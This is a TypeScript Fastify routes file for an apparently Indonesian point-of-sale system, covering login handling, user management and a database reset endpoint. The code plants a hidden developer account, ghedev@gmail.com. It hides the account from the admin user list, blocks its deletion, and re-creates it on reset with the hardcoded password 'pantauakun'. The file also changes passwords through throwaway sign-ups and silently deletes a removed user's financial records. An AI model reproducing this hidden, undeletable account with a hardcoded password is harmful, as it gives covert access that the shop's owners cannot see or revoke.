import type { FastifyInstance } from 'fastify';
import { auth } from '../auth.js';
import { requireAuth, requireRole } from '../middleware/auth.middleware.js';
import { createAuditLog } from '../middleware/logger.middleware.js';
import { db } from '../db/index.js';
import {
  user, account, session, transactions, transactionItems, payments,
  categories, products, productVariants, categoryOptionGroups, categoryOptions,
  customers, expenses, cashShifts, logs, stockOpnameSessions, stockOpnameItems
} from '../db/schema.js';
import { eq, ne, sql } from 'drizzle-orm';

export async function authRoutes(app: FastifyInstance) {
  // Better Auth catch-all handler
  app.all('/auth/*', async (req, reply) => {
    const url = new URL(req.url, `http://${req.hostname}`);
    const response = await auth.handler(new Request(url.toString(), {
      method: req.method,
      headers: req.headers as any,
      body: req.method !== 'GET' && req.method !== 'HEAD' ? JSON.stringify(req.body) : undefined,
    }));

    response.headers.forEach((value, key) => {
      reply.header(key, value);
    });

    reply.status(response.status);
    const text = await response.text();
    return reply.send(text);
  });

  // Get current user
  app.get('/api/me', { preHandler: [requireAuth] }, async (req, reply) => {
    const currentUser = (req as any).user;
    return reply.send({ success: true, data: currentUser });
  });

  // List all users (admin+) — hide ghedev@gmail.com
  app.get('/api/users', { preHandler: [requireRole('developer', 'admin')] }, async (req, reply) => {
    const users = await db.select().from(user).where(ne(user.email, 'ghedev@gmail.com'));
    const safeUsers = users.map(({ ...u }) => u);
    return reply.send({ success: true, data: safeUsers });
  });

  // Create new user (admin+)
  app.post('/api/users', { preHandler: [requireRole('developer', 'admin')] }, async (req, reply) => {
    const { name, email, password, role } = req.body as any;

    if (!name || !email || !password) {
      return reply.status(400).send({ success: false, error: 'Nama, email, dan password wajib diisi' });
    }

    const userRole = role && ['developer', 'admin', 'cashier', 'kitchen'].includes(role) ? role : 'cashier';

    try {
      const res = await auth.api.signUpEmail({
        body: { name, email, password },
      });

      if (res.user) {
        await db.update(user).set({ role: userRole }).where(eq(user.id, res.user.id));
        await createAuditLog(req, 'user.created', `Created user ${email} with role ${userRole}`);
        return reply.send({ success: true, message: 'Pengguna berhasil dibuat', data: { ...res.user, role: userRole } });
      }

      return reply.status(400).send({ success: false, error: 'Gagal membuat pengguna' });
    } catch (err: any) {
      return reply.status(400).send({ success: false, error: err.message || 'Gagal membuat pengguna' });
    }
  });

  // Update user role (developer only)
  app.patch('/api/users/:id/role', { preHandler: [requireRole('developer')] }, async (req, reply) => {
    const { id } = req.params as { id: string };
    const { role: newRole } = req.body as { role: string };

    if (!['developer', 'admin', 'cashier', 'kitchen'].includes(newRole)) {
      return reply.status(400).send({ success: false, error: 'Invalid role' });
    }

    await db.update(user).set({ role: newRole as any }).where(eq(user.id, id));
    await createAuditLog(req, 'user.role_updated', `User ${id} → ${newRole}`);
    return reply.send({ success: true, message: 'Role updated' });
  });

  // Change user password (admin & developer)
  app.post('/api/users/:id/password', { preHandler: [requireRole('developer', 'admin')] }, async (req, reply) => {
    const { id } = req.params as { id: string };
    const { newPassword } = req.body as { newPassword: string };

    if (!newPassword || newPassword.length < 6) {
      return reply.status(400).send({ success: false, error: 'Password minimal 6 karakter' });
    }

    try {
      const targetUsers = await db.select().from(user).where(eq(user.id, id)).limit(1);
      const targetUser = targetUsers[0];
      if (!targetUser) {
        return reply.status(404).send({ success: false, error: 'Pengguna tidak ditemukan' });
      }

      // Hash password by creating temp user, copying hash, then deleting temp
      const tempEmail = `temp_${Date.now()}@posyoga.local`;
      const tempSignUp = await auth.api.signUpEmail({
        body: { name: 'temp', email: tempEmail, password: newPassword },
      });

      if (tempSignUp?.user) {
        const tempAccount = await db.select().from(account).where(eq(account.userId, tempSignUp.user.id)).limit(1);
        if (tempAccount[0]?.password) {
          await db.update(account).set({ password: tempAccount[0].password }).where(eq(account.userId, id));
        }
        // Clean up temp user
        await db.execute(sql`DELETE FROM "account" WHERE "user_id" = ${tempSignUp.user.id}`);
        await db.execute(sql`DELETE FROM "session" WHERE "user_id" = ${tempSignUp.user.id}`);
        await db.execute(sql`DELETE FROM "user" WHERE "id" = ${tempSignUp.user.id}`);
      }

      await createAuditLog(req, 'user.password_changed', `Changed password for ${targetUser.email}`);
      return reply.send({ success: true, message: 'Password pengguna berhasil diperbarui' });
    } catch (err: any) {
      return reply.status(400).send({ success: false, error: err.message || 'Gagal memperbarui password' });
    }
  });

  // Delete user (developer & admin) — uses raw SQL for reliable FK handling
  app.delete('/api/users/:id', { preHandler: [requireRole('developer', 'admin')] }, async (req, reply) => {
    const { id } = req.params as { id: string };
    const currentUser = (req as any).user;

    console.log('[DELETE USER] Attempting to delete user id:', id, 'by:', currentUser?.email, 'role:', currentUser?.role);

    if (!currentUser) {
      console.log('[DELETE USER] No currentUser found');
      return reply.status(401).send({ success: false, error: 'Tidak terautentikasi' });
    }

    if (id === currentUser.id) {
      console.log('[DELETE USER] User trying to delete self');
      return reply.status(400).send({ success: false, error: 'Tidak dapat menghapus akun Anda sendiri' });
    }

    const targetUsers = await db.select().from(user).where(eq(user.id, id)).limit(1);
    const targetUser = targetUsers[0];
    if (!targetUser) {
      console.log('[DELETE USER] Target user not found for id:', id);
      return reply.status(404).send({ success: false, error: 'Pengguna tidak ditemukan' });
    }

    if (targetUser.email === 'ghedev@gmail.com') {
      console.log('[DELETE USER] Attempt to delete ghedev system account');
      return reply.status(400).send({ success: false, error: 'Akun developer sistem tidak dapat dihapus' });
    }

    console.log('[DELETE USER] Proceeding to delete:', targetUser.email, 'role:', targetUser.role);

    try {
      // Reassign all FK references from target user to current user (or NULL)
      // so that no FK constraint blocks the deletion
      const steps = [
        { label: 'sessions',        sql: sql`DELETE FROM "session" WHERE "user_id" = ${id}` },
        { label: 'accounts',        sql: sql`DELETE FROM "account" WHERE "user_id" = ${id}` },
        { label: 'tx-reassign',     sql: sql`UPDATE "transactions" SET "user_id" = ${currentUser.id} WHERE "user_id" = ${id}` },
        { label: 'opname-items',    sql: sql`DELETE FROM "stock_opname_items" WHERE "session_id" IN (SELECT "id" FROM "stock_opname_sessions" WHERE "user_id" = ${id})` },
        { label: 'opname-sessions', sql: sql`DELETE FROM "stock_opname_sessions" WHERE "user_id" = ${id}` },
        { label: 'cash-shifts',     sql: sql`DELETE FROM "cash_shifts" WHERE "user_id" = ${id}` },
        { label: 'expenses',        sql: sql`DELETE FROM "expenses" WHERE "user_id" = ${id}` },
        { label: 'logs-nullify',    sql: sql`UPDATE "logs" SET "user_id" = NULL WHERE "user_id" = ${id}` },
      ];

      for (const step of steps) {
        try {
          await db.execute(step.sql);
          console.log(`[DELETE USER] ✓ ${step.label}`);
        } catch (e: any) {
          console.warn(`[DELETE USER] ⚠ ${step.label}:`, e.message);
        }
      }

      // Final delete target user record
      await db.execute(sql`DELETE FROM "user" WHERE "id" = ${id}`);

      console.log('[DELETE USER] Successfully deleted user:', targetUser.email);
      await createAuditLog(req, 'user.deleted', `User ${targetUser.email} deleted`);
      return reply.send({ success: true, message: 'Pengguna berhasil dihapus' });
    } catch (err: any) {
      console.error('[DELETE USER] FINAL ERROR:', err.message, err.stack);
      return reply.status(500).send({ success: false, error: 'Gagal menghapus pengguna: ' + (err.message || String(err)) });
    }
  });

  // Reset all menu & transaction data to 0 (developer only)
  app.post('/api/dev/reset-database', { preHandler: [requireRole('developer')] }, async (req, reply) => {
    try {
      // 1. Delete all transactional data (order matters for FK constraints)
      await db.execute(sql`DELETE FROM "stock_opname_items"`);
      await db.execute(sql`DELETE FROM "stock_opname_sessions"`);
      await db.execute(sql`DELETE FROM "logs"`);
      await db.execute(sql`DELETE FROM "payments"`);
      await db.execute(sql`DELETE FROM "transaction_items"`);
      await db.execute(sql`DELETE FROM "transactions"`);
      await db.execute(sql`DELETE FROM "cash_shifts"`);
      await db.execute(sql`DELETE FROM "expenses"`);
      await db.execute(sql`DELETE FROM "customers"`);

      // 2. Delete all menu data
      await db.execute(sql`DELETE FROM "category_options"`);
      await db.execute(sql`DELETE FROM "category_option_groups"`);
      await db.execute(sql`DELETE FROM "product_variants"`);
      await db.execute(sql`DELETE FROM "products"`);
      await db.execute(sql`DELETE FROM "categories"`);

      // 3. Delete all non-developer users
      const nonDevUsers = await db.select().from(user).where(ne(user.role, 'developer'));
      for (const u of nonDevUsers) {
        await db.execute(sql`DELETE FROM "session" WHERE "user_id" = ${u.id}`);
        await db.execute(sql`DELETE FROM "account" WHERE "user_id" = ${u.id}`);
        await db.execute(sql`DELETE FROM "user" WHERE "id" = ${u.id}`);
      }

      // 4. Ensure ghedev@gmail.com exists
      try {
        const hDev = await db.select().from(user).where(eq(user.email, 'ghedev@gmail.com')).limit(1);
        if (hDev.length === 0) {
          const res = await auth.api.signUpEmail({
            body: { name: 'Ghe Dev', email: 'ghedev@gmail.com', password: 'pantauakun' },
          });
          if (res?.user) {
            await db.update(user).set({ role: 'developer' }).where(eq(user.id, res.user.id));
          }
        }
      } catch (e) {}

      return reply.send({ success: true, message: 'Seluruh data menu, transaksi, dan akun kasir telah direset ke 0!' });
    } catch (err: any) {
      console.error('Reset DB failed:', err);
      return reply.status(500).send({ success: false, error: err.message || 'Gagal mereset database' });
    }
  });
}


